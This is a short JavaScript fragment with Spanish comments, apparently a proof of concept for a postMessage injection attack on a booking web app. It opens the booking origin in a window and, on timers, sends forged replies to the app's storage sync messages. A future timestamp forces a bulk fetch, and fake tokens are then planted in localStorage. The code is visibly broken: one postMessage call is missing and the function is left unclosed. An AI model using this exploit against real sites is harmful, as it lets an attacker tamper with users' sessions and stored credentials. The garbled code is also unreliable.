function launchAttack() {
  const bookingWindow = window.open(BOOKING_ORIGIN, "booking");
  
  // Esperamos a que cargue y empiece a mandar mensajes

  // Respondemos con timestamp futuro → app hace getmulti → Ie=1
  // Respondemos con fake tokens → tokens inyectados en localStorage
  
  setTimeout(() => {
    // Respuesta falsa al getItem("ADS_LASTSYNC") (ID=0)

      namespace: NAMESPACE,
      id: 0,  // primer sendMessage del app
      value: String(Date.now() + 1000000)  // futuro → forza getmulti
    }, BOOKING_ORIGIN);
  }, 1200);

  setTimeout(() => {
    // Respuesta falsa al getmulti (ID=1)
    bookingWindow.postMessage({
      namespace: NAMESPACE,
      id: 1,
      value: FAKE_TOKENS
    }, BOOKING_ORIGIN);
  }, 1400);
